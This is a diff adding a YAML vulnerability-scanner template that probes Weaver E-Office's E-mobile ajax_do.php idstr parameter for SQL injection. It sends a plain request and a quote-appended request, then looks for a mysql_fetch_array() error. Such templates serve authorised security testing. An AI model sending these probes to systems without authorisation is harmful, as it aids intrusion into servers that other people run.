@@ -1,0 +1,29 @@
+id: poc-yaml-weaver-e-office-ajaxdo-php-idstr-sqli
+info:
+  name: 泛微-EOffice E-mobilecreateajax_do.php idstr参数 SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: Endpoint Manager Mobile
+variables:
+  path: 'E-mobile/create/ajax_do.php?diff=word&idstr=1
+
+    E-mobile/create/ajax_do.php?diff=wordsearch&idstr=1'
+requests:
+- method: GET
+  path: /{{.path}}
+  expression: 'status_code == 200 &&
+
+    contains(body,"<div align=\"center\">暂无相关数据...</div>") &&
+
+    !contains(body,"mysql_fetch_array()")
+
+    '
+- method: GET
+  path: /{{.path}}'
+  expression: 'status_code == 200 &&
+
+    contains(body,"mysql_fetch_array()")
+
+    '
+transport: http
